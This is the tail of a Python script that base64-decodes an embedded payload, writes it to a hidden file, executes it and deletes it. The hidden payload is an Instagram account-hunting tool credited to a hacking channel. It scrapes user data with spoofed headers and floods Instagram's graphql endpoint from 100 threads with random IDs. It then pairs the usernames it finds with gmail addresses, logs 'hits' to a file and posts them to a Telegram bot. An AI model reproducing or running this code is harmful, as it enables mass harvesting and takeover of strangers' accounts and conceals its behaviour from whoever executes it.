AgICdhY2NlcHQnOiAnYXBwbGljYXRpb24vanNvbiwgdGV4dC9wbGFpbiwgKi8qJywKICAgICAgICAnYWNjZXB0LWxhbmd1YWdlJzogJ2VuLVVTLGVuO3E9MC45JywKICAgICAgICAnb3JpZ2luJzogJ2h0dHBzOi8vc3Rvcmllc2lnLmluZm8nLAogICAgICAgICdwcmlvcml0eSc6ICd1PTEsIGknLAogICAgICAgICdyZWZlcmVyJzogJ2h0dHBzOi8vc3Rvcmllc2lnLmluZm8vJywKICAgICAgICAnc2VjLWNoLXVhJzogJyJOb3QpQTtCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTI3IiwgIkNocm9taXVtIjt2PSIxMjciJywKICAgICAgICAnc2VjLWNoLXVhLW1vYmlsZSc6ICc/MCcsCiAgICAgICAgJ3NlYy1jaC11YS1wbGF0Zm9ybSc6ICciV2luZG93cyInLAogICAgICAgICdzZWMtZmV0Y2gtZGVzdCc6ICdlbXB0eScsCiAgICAgICAgJ3NlYy1mZXRjaC1tb2RlJzogJ2NvcnMnLAogICAgICAgICdzZWMtZmV0Y2gtc2l0ZSc6ICdzYW1lLXNpdGUnLAogICAgICAgICd1c2VyLWFnZW50Jzogc3RyKGdlbmVyYXRlX3VzZXJfYWdlbnQoKSksCiAgICB9CgogICAgdHJ5OgogICAgICAgIHJyciA9IHJlcXVlc3RzLmdldChmJ2h0dHBzOi8vYXBpLWlnLnN0b3JpZXNpZy5pbmZvL2FwaS91c2VySW5mb0J5VXNlcm5hbWUve3VzZXJuYW1lfScsIGhlYWRlcnM9aGVhZGVycykuanNvbigpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcnJyID0ge30KCiAgICBJZCA9IHJyci5nZXQoJ3Jlc3VsdCcsIHt9KS5nZXQoJ3VzZXInLCB7fSkuZ2V0KCdwaycsICdub25lJykKICAgIGZvd3MgPSBycnIuZ2V0KCdyZXN1bHQnLCB7fSkuZ2V0KCd1c2VyJywge30pLmdldCgnZm9sbG93ZXJfY291bnQnLCAnbm9uZScpCiAgICBmb3dnID0gcnJyLmdldCgncmVzdWx0Jywge30pLmdldCgndXNlcicsIHt9KS5nZXQoJ2ZvbGxvd2luZ19jb3VudCcsICdub25lJykKICAgIHBwID0gcnJyLmdldCgncmVzdWx0Jywge30pLmdldCgndXNlcicsIHt9KS5nZXQoJ21lZGlhX2NvdW50JywgJ25vbmUnKQoKICAgIHRyeToKICAgICAgICBoeSA9IGludChJZCkgaWYgSWQgIT0gJ25vbmUnIGVsc2UgTm9uZQogICAgICAgIGRhdHRlID0gZGF0ZShoeSkgaWYgaHkgZWxzZSAnbm9uZScKICAgIGV4Y2VwdDoKICAgICAgICBkYXR0ZSA9ICdub25lJwoKICAgIGFjYSArPSAxCiAgICB0bGcgPSBmJycnCiDqp4HgvLog8J2XlPCdl5bwnZeW8J2XovCdl6jwnZeh8J2XpyDwnZec8J2XofCdl6bwnZen8J2XlPCdl5rwnZel8J2XlPCdl6Ag4Ly76qeCICAKCvCdkIfwnZCi8J2QrToge2FjYX0gIArwnZCK8J2QrvCdkKXwnZCl8J2QmvCdkKfwnZuK8J2QnPCdm4og8J2QgPCdkJ3wnZuKOiB7dXNlcm5hbWV9ICAK8J2QjPCdkJrwnZCi8J2QpToge3VzZXJuYW1lfUB7Z2d9ICAK8J2QkfCdkJ7wnZCs8J2QnvCdkK06IHtyZXN0KHVzZXJuYW1lKX0gCvCdkJPwnZCa8J2Qq/CdkKLwnZChOiAyMDEyCvCdkJTwnZCr8J2QpTogaHR0cHM6Ly9pbnN0YWdyYW0uY29tL3t1c2VybmFtZX0gCgpCeSBAV2FyeGVscyB+IEBRdWVyeVRvb2wKCicnJwoKICAgIHdpdGggb3BlbignMjAxMmhpdHMudHh0JywgJ2EnKSBhcyBmZjoKICAgICAgICBmZi53cml0ZShmJ3t0bGd9XG4nKQoKICAgIHRyeToKICAgICAgICB0cnk6cmVxdWVzdHMuZ2V0KGYiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHt0b2t9L3NlbmRNZXNzYWdlP2NoYXRfaWQ9e2lkZH0mdGV4dD17dGxnfSIpCiAgICAgICAgZXhjZXB0OnBhc3MKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwYXNzCiAgICAgICAgCmRlZiBnZygpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBkYXRhID0gewogICAgICAgICAgICAibHNkIjogJycuam9pbihyYW5kb20uY2hvaWNlcyhzdHJpbmcuYXNjaWlfbGV0dGVycyArIHN0cmluZy5kaWdpdHMsIGs9MzIpKSwKICAgICAgICAgICAgInZhcmlhYmxlcyI6IGpzb24uZHVtcHMoeyJpZCI6IGludChyYW5kb20ucmFuZHJhbmdlKGJiaywgaWQpKSwgInJlbmRlcl9zdXJmYWNlIjogIlBST0ZJTEUifSksCiAgICAgICAgICAgICJkb2NfaWQiOiAiMjU2MTgyNjE4NDExNTA4NDAiCiAgICAgICAgfQoKICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QoCiAgICAgICAgICAgICJodHRwczovL3d3dy5pbnN0YWdyYW0uY29tL2FwaS9ncmFwaHFsIiwKICAgICAgICAgICAgaGVhZGVycz17IlgtRkItTFNEIjogZGF0YVsibHNkIl19LAogICAgICAgICAgICBkYXRhPWRhdGEKICAgICAgICApCiAgICAgICAgdHJ5OgogICAgICAgICAgICB1c2VybmFtZSA9IHJlc3BvbnNlLmpzb24oKS5nZXQoJ2RhdGEnLCB7fSkuZ2V0KCd1c2VyJywge30pLmdldCgndXNlcm5hbWUnKQogICAgICAgICAgICBlbWFpbHMgPSBbdXNlcm5hbWUgKyAnQGdtYWlsLmNvbSddCiAgICAgICAgICAgIGZvciBlbWFpbCBpbiBlbWFpbHM6CiAgICAgICAgICAgICAgICBjaGVjayhlbWFpbCkKICAgICAgICBleGNlcHQ6JycKZm9yIF8gaW4gcmFuZ2UoMTAwKToKICAgIFRocmVhZCh0YXJnZXQ9Z2cpLnN0YXJ0KCkKICAgIAojQnk6QFdhcnhlbHMgJiBDaGFubmVsOiBAUXVlcnlIYWNrCgoKICAgIAogICAg'
try:
    with open(A, 'wb') as D:D.write(B.b64decode(C))
    os.system('python3 .ninjapy'+' '.join(sys.argv[1:]))
except Exception as E:print(E)
finally:
    if os.path.exists(A):os.remove(A)
